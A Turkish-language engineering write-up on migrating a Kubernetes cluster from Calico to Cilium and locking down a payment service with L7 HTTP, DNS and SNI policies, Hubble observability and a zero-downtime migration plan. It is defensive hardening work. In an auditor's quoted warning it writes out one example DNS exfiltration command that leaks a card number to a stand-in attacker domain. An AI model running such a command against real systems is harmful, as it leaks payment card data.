---
title: Cilium L7 Güvenlik Mimarisi — Ödeme Servisi Senaryosu
layout: article
key: cilium-l7-security
---

# Cilium L7 Güvenlik Mimarisi, Sorun Giderme ve Mühendislik Karar Süreçleri

Faz 38'de (OpenShift) roadmap'in tamamlayıcı bölümünü kapatmıştım. Bu faz **farklı bir formatta** ilerledi: hazır roadmap sayfası değil, **gerçek bir enterprise senaryosunu** (ödeme servisi güvenliği) sıfırdan çözme süreci — eğitim/kavram anlatımından, doğrudan senaryo bazlı uygulama mühendisliğine geçiş.

**Bu belgedeki tüm YAML ve script'ler, markdown'a gömülü değil — gerçek, çalıştırılabilir dosyalar:**

- [`manifests/lab-setup.yaml`](./manifests/lab-setup.yaml) — test ortamı (namespace, pod'lar, Service)
- [`manifests/payment-api-l7-policy.yaml`](./manifests/payment-api-l7-policy.yaml) — üretime hazır, doğrulanmış politika
- [`manifests/payment-api-l7-policy-dns-hardened.yaml`](./manifests/payment-api-l7-policy-dns-hardened.yaml) — DNS exfiltration korumalı ileri versiyon
- [`scripts/test-l7-policy.sh`](./scripts/test-l7-policy.sh) — doğrulama testleri
- [`scripts/setup-hubble.sh`](./scripts/setup-hubble.sh) — gözlemlenebilirlik kurulumu

---

## 1. Ortam ve Hedef

- **İşletim Sistemi:** Rocky Linux 9 (Vagrant Sanal Makinesi)
- **Cluster Yapısı:** Tek düğümlü Kubernetes kontrol düzlemi (`rocky9.localdomain`)
- **CNI:** Cilium v1.20.0 (Calico'nun yerine, sıfırdan kuruldu)
- **Tetikleyici senaryo:** _"Calico'nun karşılayamadığı L7 (HTTP path/metot) güvenlik filtreleme gereksinimini karşılamak, haftaya prod'a geçmeden önce tüm davranışları doğrulamak."_

Cluster'ı Calico'dan Cilium'a geçirirken karşılaşılan iki gerçek sorun ve kök neden analizleri:

**Sorun 1 — Cilium Operator "Pending" kaldı.** Cilium varsayılan olarak `replicas: 2` + `podAntiAffinity` ile HA hedefler; tek node'lu ortamda ikinci kopya için yer bulunamadı. Çözüm: `kubectl scale deployment cilium-operator -n kube-system --replicas=1` (not: prod'da çok node'lu yapıda mutlaka `2`'ye geri dönülmeli).

**Sorun 2 — `cilium connectivity test` timeout verdi.** İki ayrı sebep üst üste geldi: (a) node'daki `control-plane:NoSchedule` taint'i test pod'larının zamanlanmasını engelledi — `kubectl taint nodes --all node-role.kubernetes.io/control-plane-` ile çözüldü (Faz 32/33'teki taint bilgisiyle birebir aynı mekanizma); (b) Vagrant NAT ağı üzerinden imaj indirme süresi CLI'nin varsayılan zaman aşımını aştı. Taint kaldırılıp namespace'ler temizlenince test **79/79 başarılı** sonuçlandı.

---

## 2. Calico ve Cilium — Karşılaştırmalı Analiz

| Kriter               | Calico (OSS)                                              | Cilium                                                         |
| -------------------- | --------------------------------------------------------- | -------------------------------------------------------------- |
| Çalışma prensibi     | `iptables`, IPVS, BGP                                     | Linux çekirdeğine gömülü eBPF                                  |
| Denetim katmanı      | L3/L4 (IP, port)                                          | L3/L4 + yerel L7 (HTTP path, metot, header)                    |
| HTTP farkındalığı    | Yok — `GET /public` ile `DELETE /admin` ikisi de "TCP 80" | Var — eBPF paketi yakalar, L7 kuralı varsa Envoy'a yönlendirir |
| Performans ölçeği    | Kural arttıkça `iptables` zinciri uzar, O(N)              | eBPF hash map, kural sayısından bağımsız O(1)                  |
| FQDN desteği         | Kırılgan, harici mekanizma gerektirir                     | DNS trafiğini çekirdekte dinler, dönen IP'yi dinamik ekler     |
| Çekirdek bağımlılığı | Eski çekirdeklerde (3.x/4.x) sorunsuz                     | Modern çekirdek (5.4+) gerektirir                              |

**Çapraz referans:** Bu fazda kanıtlanan `iptables` O(N) sınırlaması, Faz 28'de kube-proxy'nin iptables modunu incelerken **kavramsal olarak** değindiğimiz bir noktaydı — burada gerçek bir mimari karar gerekçesi olarak somutlaştı.

---

## 3. Senaryo: Ödeme Servisi (`payment-api`)

**Talepler:**

1. Sadece `frontend` pod'undan gelen istekler kabul edilecek
2. Sadece `POST /api/v1/charge` — diğer tüm metot/path'ler engellenecek
3. `payment-api` internete kapalı, sadece izinli dış adrese (banka/GitHub API) çıkabilecek

### 3.1. Trafiğin Yönü — Ingress vs Egress

**Ingress**, dışarıdan `payment-api`'ye gelen bağlantılar (`frontend` → `payment-api`). **Egress**, `payment-api`'nin kendi başlattığı dış bağlantılar (`payment-api` → banka). Kritik nokta: bankadan dönen `HTTP 200` yanıtı için ayrı bir Ingress kuralı **gerekmiyor** — çekirdek seviyesindeki `conntrack`, giden isteğin dönüş paketini otomatik tanıyor (stateful).

### 3.2. Üç Gerçek Tuzak

**Tuzak 1 — Kubelet Health Check Krizi.** Sadece `frontend` → `POST /api/v1/charge` kuralı yazılırsa, node'un kendi `GET /healthz` health check isteği de Envoy tarafından `403` ile reddediliyor. Kubelet bunu "pod öldü" sanıp podu `CrashLoopBackOff` döngüsüne sokuyor. **Çözüm:** `fromEntities: host` ile node'un kendi health check trafiğine ayrı, açık izin vermek (bkz. `payment-api-l7-policy.yaml` içindeki 2. ingress kuralı).

**Tuzak 2 — DNS Egress Unutmak.** Egress kuralı tanımlanan anda pod için default-deny devreye giriyor. Sadece dış hedefe (`toFQDNs`) izin verilip **CoreDNS'e (port 53) izin verilmezse**, pod hedefin IP'sini hiç çözemiyor, `Could not resolve host` hatasıyla çöküyor. **Çözüm:** Egress kurallarında her zaman `kube-dns`'e açık izin (bkz. dosyadaki 1. egress kuralı) — bu, Faz 37'deki Calico Network Policy testinde **bulduğumuz aynı tuzağın**, Cilium'da da geçerli olduğunun kanıtı.

**Tuzak 3 — "Kural Yazdım Ama Çalışmıyor" Teşhisi.** Bir politika beklendiği gibi davranmazsa sırasıyla: (1) `kubectl get ciliumendpoints -n <ns>` ile etiketlerin gerçekten eşleştiğini (`Enforcing: Ingress=true`) doğrula; (2) `cilium-dbg endpoint get <id>` ile paketin gerçekten Envoy'a ulaşıp ulaşmadığını, kaç paketin `allowed`/`dropped` olduğunu gör.

### 3.3. Gerçek Terminal Kanıtı — Heredoc Tuzağı (Tekrar Eden Bir Örüntü)

Politika ilk uygulandığında, terminale **çok satırlı heredoc** (`cat <<EOF | kubectl apply -f -`) ile yapıştırırken DNS/FQDN blokları **kırpılarak** gitti — `kubectl apply` "created" dedi ama gerçek YAML eksikti, sonuç `api.github.com` bile timeout (`000`) verdi. `kubectl get cnp ... -o yaml` ile gerçek içerik kontrol edilince eksik olduğu görüldü, `kubectl delete` + temiz yeniden `apply` ile düzeltildi.

**Bu, Faz 36'daki (Kubectl Shortcuts) heredoc bozulma deneyiminin — farklı bir gün, farklı bir araç, ama aynı sınıf hatanın — tekrarıdır.** Ders: heredoc ile büyük YAML yapıştırırken, `kubectl apply` çıktısının "created/unchanged" demesi **içeriğin doğru gittiğinin kanıtı değildir** — her zaman `-o yaml` ile gerçek içeriği doğrulamak gerekir.

### 3.4. Test Sonuçları (Gerçek, `./scripts/test-l7-policy.sh` ile Tekrarlanabilir)

| Test | İstek                                      | Sonuç                                 |
| ---- | ------------------------------------------ | ------------------------------------- |
| 1    | `POST /api/v1/charge` (frontend'den)       | `200` ✅                              |
| 2    | `GET /api/v1/charge` (yanlış metot)        | `403` ✅ (Envoy L7'de kesti)          |
| 3    | `POST /admin` (yasaklı path)               | `403` ✅                              |
| 4    | `payment-api` → `api.github.com`           | `200` ✅ (SNI doğrulandı)             |
| 5    | `payment-api` → `www.google.com` (yasaklı) | `000` timeout ✅ (paket hiç çıkamadı) |

---

## 4. İkinci Kriz Turu — Denetim ve Gözlemlenebilirlik

Senaryo devam ettirildi: L7 politikası devredeyken güvenlik denetçisi ve operasyon ekibinden iki yeni talep geldi.

### 4.1. DNS Exfiltration Riski

**Denetçi raporu:** _"payment-api'ye DNS izni (port 53) verdik, ama sorgulanan isme sınır yok. Saldırgan sızarsa `nslookup kartno-4111222233334444.saldirgan.com` ile kart verisini DNS sorgusu içinde dışarı sızdırabilir."_

Calico bu düzeyde koruma sağlayamaz — sadece "port 53 açık mı" der, sorgulanan **isme** bakamaz. Cilium'un L7 DNS desteği ile, `matchPattern` kullanılarak **hangi domain'lerin sorgulanabileceği** sınırlandırılabiliyor:

```yaml
rules:
  dns:
    - matchPattern: "*.cluster.local" # küme içi servisler
    - matchPattern: "*.banka.com" # sadece bankanın domain ailesi
```

Bu, `payment-api-l7-policy-dns-hardened.yaml` dosyasında tam olarak uygulanmıştır — `saldirgan.com` gibi listede olmayan bir domain, sorgu **CoreDNS'e hiç ulaşmadan çekirdekte DROP edilir.**

### 4.2. Kör Uçuşu Bitirmek — Hubble

**NOC ekibi şikayeti:** _"403 alıyoruz ama neden engellendiğini göremiyoruz — path mi yanlış, header mı eksik, yoksa health check mi patladı?"_

Klasik `tcpdump`, Kubernetes dünyasında yetersiz kalıyor çünkü (1) IP'ler geçici, 5 dakika sonra başka pod'a ait olabilir, (2) L7 mi L3/4 mü reddedildiği görünmüyor, (3) trafik şifreliyse içerik hiç okunamıyor.

**Hubble**, Cilium'un kimlik tabanlı (identity-aware) gözlem katmanı — IP yerine `default/frontend` gibi Kubernetes kimlikleriyle konuşuyor. `./scripts/setup-hubble.sh` ile kurulup gerçek testle doğrulandı:

- Web arayüzü (`cilium hubble ui` + port-forward) üzerinden **gerçek, canlı** trafik haritası görüntülendi
- `frontend → payment-api`: `POST /api/v1/charge` → **yeşil (forwarded)**, `DELETE` → **kırmızı (403 dropped)**
- `payment-api → api.github.com`: **yeşil**; `payment-api → www.google.com`: **kırmızı (eBPF drop)**

Bu, sadece kavramsal değil — **gerçek bir ekran görüntüsüyle canlı olarak doğrulanmıştır:**

![Hubble UI — trafik grafiği: izinli POST/api.github.com yeşil, engellenmiş DELETE/google.com kırmızı](./assets/hubble-flow-graph.png)

_Grafik görünüm — `frontend → payment-api` ve `payment-api → api.github.com` bağlantıları yeşil (forwarded), `payment-api → www.google.com` bağlantısı kırmızı (dropped)._

![Hubble UI — akış tablosu: L7 info sütununda POST/api/v1/charge forwarded, DELETE/api/v1/charge dropped olarak görünüyor](./assets/hubble-flow-table.png)

_Tablo görünüm — `L7 info` sütununda `POST /api/v1/charge` isteklerinin `forwarded`, `DELETE /api/v1/charge` isteklerinin `dropped` olarak işaretlendiği, saniye saniye gerçek zaman damgalarıyla görülüyor._

---

## 5. Şifreli Trafik — TLS/SNI Mimarisi

**Son soru:** _"Trafik HTTPS ise, Envoy şifreli paketin içindeki `POST /api/v1/charge` ayrımını nasıl okuyacak?"_

İki farklı durum var:

**İç trafik (`frontend` → `payment-api`, kendi kontrolündeki taraflar):** Envoy'a bir SSL sertifikası verilir — **TLS Termination.** Envoy trafiği kendi anahtarıyla açar, HTTP içeriğini (path/metot) okur, kural kontrolü yapar, sonra `payment-api`'ye iletir.

**Dış trafik (`payment-api` → banka, bankanın anahtarına erişim yok):** Envoy paketin **içini açamaz.** Ama TLS bağlantısının ilk "merhaba" paketinde, hedef domain adı henüz şifrelenmemiş halde gönderiliyor — buna **SNI (Server Name Indication)** deniyor. Cilium, paketin içeriğini değil, **bu SNI etiketini** okuyor: etikette izinli domain varsa geçirir, yoksa **internete hiç çıkmadan** DROP eder.

Bu ayrım, `payment-api → www.google.com` testinin **`000` (timeout)** dönmesinin tam açıklaması — paket, bankanın cevabına göre değil, **giden isteğin SNI etiketine** göre daha kapıdan çıkmadan reddedildi.

---

## 6. Canlı Geçiş Stratejisi — Blue/Green Migration

**CTO sorusu:** _"300 pod'lu, günde milyonlarca lira ciro yapan bir cluster'da Calico'dan Cilium'a nasıl sıfır kesintiyle geçilir?"_

**Neden tek seferde (in-place) geçiş yapılamaz:** İki CNI aynı anda aynı sunucuda çalışamaz (ikisi de aynı `veth` çiftlerini, IP havuzlarını yönetmeye çalışır, kernel çakışır). Eski CNI silinince, o CNI'nin verdiği pod IP'leri yeni CNI tarafından tanınmaz — pod'lar "öksüz" kalır.

**Doğru strateji — Node Pool / Blue-Green:**

1. Mevcut Calico node'larına dokunmadan, yeni node'lar (ya da mevcutlardan bir grup) Cilium için ayrılır
2. Bakım penceresinde, düğüm düğüm: `kubectl cordon node-1` (yeni pod almayı durdur) → `kubectl drain node-1 --ignore-daemonsets --delete-emptydir-data` (pod'ları nazikçe tahliye et) — Kubernetes, eski pod'u kapatmadan önce Cilium'lu temiz node'da yeni pod'u açar
3. Ya da servis bazında sırayla `kubectl rollout restart deployment/payment-api` — Kubernetes yeni (Cilium IP'li) pod hazır olana kadar eskisini öldürmez

Bu, müşteri kesintisi hissetmeden yapılan bir geçiş — "tek seferde silip kur" yaklaşımının 3-10 dakikalık ağ vakumu ve geri dönüşsüz risk taşıdığı gerçek bir mühendislik kararı olarak değerlendirilmiştir.

---

## 7. Mimarinin Sınırları — Race Condition

Ağ katmanının **çözemediği** bir problem de dürüstçe ele alındı: bir kullanıcının tek kullanımlık kuponu, eş zamanlı iki paralel `POST /api/v1/charge` isteğiyle iki kez kullanmaya çalışması (TOCTOU / Race Condition).

Cilium her iki isteği de meşru birer `POST` olarak görür — **durum (state) tutmaz**, kuponun daha önce kullanılıp kullanılmadığını bilemez. Bu, **ağ seviyesinin değil, uygulama/veri seviyesinin** sorumluluğu:

- **Idempotency Key** — istek başlığında benzersiz işlem kimliği zorunlu kılmak
- **Dağıtık kilit** — Redis üzerinden `SET ... NX`
- **Veritabanı kilidi** — `SELECT ... FOR UPDATE`

---

## 📊 Özet

| Konu                        | Ne Kanıtlandı                                                                                     |
| --------------------------- | ------------------------------------------------------------------------------------------------- |
| Cilium kurulumu             | Operator HA/anti-affinity ve control-plane taint tuzakları gerçek hatalarla teşhis edilip çözüldü |
| L7 Ingress                  | HTTP metot/path filtrelemesi gerçek testle (200/403) kanıtlandı                                   |
| Kubelet health check tuzağı | `fromEntities: host` olmadan CrashLoopBackOff'un gerçekleştiği, çözümün doğrulandığı              |
| DNS egress tuzağı           | Egress kuralı + DNS izni eksikliğinin her şeyi timeout'a düşürdüğü                                |
| DNS Exfiltration            | `matchPattern` ile domain bazlı DNS kısıtlamasının mimari çözümü                                  |
| Hubble                      | Kimlik tabanlı, gerçek zamanlı trafik gözlemi canlı ekran görüntüsüyle doğrulandı                 |
| TLS/SNI                     | Şifreli trafikte L7 filtrelemenin iç/dış trafik için farklı çalıştığı                             |
| Migration                   | Blue/Green node pool stratejisiyle sıfır kesintili geçiş planı                                    |
| Race Condition              | Ağ katmanının sınırları dürüstçe kabul edilip üst katman çözümlerine yönlendirildi                |

---

ℹ️ _Bu senaryo, roadmap'in dışında, "uygulama mühendisliği" formatında işlenmiştir — hazır YAML verilip test edilmesi değil, gerçek hataların (heredoc kırpılması, operator pending, DNS tuzağı) yaşanıp kök nedeniyle çözülmesi süreci belgelenmiştir. Tüm YAML ve script dosyaları bu belgeyle birlikte, ayrı ve çalıştırılabilir halde bulunmaktadır._
